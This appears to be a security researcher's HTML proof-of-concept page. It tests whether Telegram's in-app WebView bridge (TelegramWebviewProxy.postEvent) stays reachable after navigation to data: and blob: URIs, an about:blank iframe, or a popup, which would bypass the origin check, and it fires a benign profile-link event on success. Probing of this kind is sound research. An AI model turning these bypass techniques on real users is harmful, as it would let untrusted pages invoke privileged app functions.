<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Origin Bypass Test</title>
<style>
body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
h2{color:#0f0;margin:0 0 4px 0}
#log{background:#111;padding:6px;max-height:300px;overflow:auto;white-space:pre-wrap;font:11px monospace}
button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
button.fire{background:#4a0000;border-color:#f44;font-size:13px}
.green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
</style></head><body>
<h2>Origin Bypass — Cross-Origin Bridge Test</h2>
<div id="log"></div>
<div id="btns"></div>

<script>
const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};

const origin = location.origin;
L(`Current origin: ${origin}`,'yellow');

const hasBridge = !!(window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent);
L(`Bridge: ${hasBridge ? 'YES' : 'NO'}`,'green');

// Test postEvent from THIS origin
if (hasBridge) {
  L('Sending test from current origin...');
  window.TelegramWebviewProxy.postEvent('web_app_open_tg_link', {path_full: '/durov'});
  L('Sent. Should open Durov profile.','green');
}

// Test 1: data: URI redirect trick
function testDataUri() {
  L('--- Test: data: URI redirect ---','yellow');
  const evil = `data:text/html,<script>
    var L2=function(s){document.body.innerHTML+=s+'<br>'};
    L2('data: URI loaded');
    L2('origin: '+location.origin);
    var b=!!(window.TelegramWebviewProxy&&window.TelegramWebviewProxy.postEvent);
    L2('Bridge: '+(b?'YES - ORIGIN BYPASS CONFIRMED!':'no'));
    if(b){
      window.TelegramWebviewProxy.postEvent('web_app_open_tg_link',{path_full:'/durov'});
      L2('Sent from data: URI!');
    }
  <\/script>`;
  location.href = evil;
}

// Test 2: iframe with different origin
function testIframe() {
  L('--- Test: about:blank iframe ---','yellow');
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.onload = function() {
    try {
      const win = iframe.contentWindow;
      L('iframe origin: ' + (function(){try{return win.location.origin}catch(e){return e.message}})());
      const hasBridge = !!(win.TelegramWebviewProxy && win.TelegramWebviewProxy.postEvent);
      L('iframe bridge: ' + (hasBridge ? 'YES - accessible!' : 'no'));
      if (hasBridge) {
        L('ABOUT:BLANK BYPASS!','red');
      }
    } catch(e) {
      L('iframe access error: '+e.message,'red');
    }
  };
  document.body.appendChild(iframe);
  iframe.src = 'about:blank';
}

// Test 3: window.open to about:blank
function testPopup() {
  L('--- Test: popup window ---','yellow');
  const w = window.open('about:blank', '_blank', 'width=400,height=300');
  if (!w) { L('Popup blocked!','red'); return; }
  L('Popup opened');
  setTimeout(function() {
    try {
      w.document.body.innerHTML = '<pre id="out" style="color:lime;background:#000"></pre>';
      const o = w.document.getElementById('out');
      o.textContent = 'origin: ' + w.location.origin + '\n';
      o.textContent += 'bridge: ' + (!!(w.TelegramWebviewProxy && w.TelegramWebviewProxy.postEvent) ? 'YES!!!' : 'no');
      L('Popup result written');
    } catch(e) {
      L('Popup error: '+e.message,'red');
    }
  }, 1000);
}

// Test 4: blob: URI  
function testBlob() {
  L('--- Test: blob URI ---','yellow');
  const html = `<html><body><pre id="o"></pre><script>
    var L=function(s){document.getElementById('o').textContent+=s+'\\n'};
    L('blob URI loaded');
    L('origin: '+location.origin);
    var b=!!(window.TelegramWebviewProxy&&window.TelegramWebviewProxy.postEvent);
    L('bridge: '+(b?'YES!':'no'));
    if(b) window.TelegramWebviewProxy.postEvent('web_app_open_tg_link',{path_full:'/durov'});
  <\/script></body></html>`;
  const blob = new Blob([html], {type: 'text/html'});
  const url = URL.createObjectURL(blob);
  L('blob URL: '+url);
  location.href = url;
}

L('','green');
document.getElementById('btns').innerHTML = `
  <button class="fire" onclick="testDataUri()">TEST: data: URI redirect → bridge survives?</button>
  <button class="fire" onclick="testBlob()">TEST: blob URI redirect → bridge survives?</button>
  <button onclick="testIframe()">TEST: about:blank iframe access</button>
  <button onclick="testPopup()">TEST: popup window (may be blocked)</button>
  <button onclick="location.reload()">RELOAD (come back)</button>
`;
</script>
</body>
</html>
